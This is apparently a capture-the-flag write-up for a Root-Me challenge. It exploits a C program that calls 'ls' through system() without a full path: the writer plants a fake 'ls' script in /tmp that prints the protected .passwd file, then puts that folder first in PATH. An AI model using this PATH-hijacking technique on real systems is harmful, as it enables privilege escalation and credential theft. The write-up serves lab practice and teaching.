```
ssh -p 2222 app-script-ch12@challenge02.root-me.org
```

The code inside ch12 is

```
#include <stdlib.h>
#include <stdio.h>

int main(){
        system("ls -lA /challenge/app-script/ch12/.passwd");
        return 0;
}
```

The problem here is the use of -lA, which is not recognized by cat. But that is not a problem, we can create our own ls function.

```
mkdir /tmp/vuln
nano ls
```

In the ls file, enter
```
cat $2
```
The $2 allows us to skip the -lA argument.
Then, change the path:

```
export PATH=/tmp/vuln:$PATH
cd
./ch12
```

Get the password !
